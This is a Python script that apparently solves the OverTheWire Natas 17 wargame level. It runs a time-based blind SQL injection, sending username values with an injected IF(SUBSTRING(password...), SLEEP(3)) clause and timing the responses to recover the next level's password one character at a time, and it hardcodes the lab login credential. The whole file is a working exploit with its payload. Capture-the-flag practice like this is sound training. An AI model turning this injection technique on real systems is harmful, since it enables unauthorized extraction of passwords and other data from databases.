import requests
import time

url = 'http://natas17.natas.labs.overthewire.org'
user = 'natas17'
password = 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC'


natas18_pass = ''
caracteres = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
for i in range(1, 33):
    time_max = 0
    caractere_max = ''
    for c in caracteres:
        data = {'username' : f'natas18" and IF(BINARY SUBSTRING(password, {i}, 1) = "{c}", SLEEP(3), null) # '} 
        start = time.time()
        response2 = requests.get(url, auth=(user, password), params=data)
        finished = time.time() - start
        print(f'Caractere {c} na posição {i}. Tempo: {finished}')
        if (finished > time_max):
            caractere_max = c
            time_max = finished

    print(f'Caractere vencedor {caractere_max} na posição {i}')
    natas18_pass = natas18_pass + caractere_max
print(natas18_pass)
#print(response.content == response2.content)
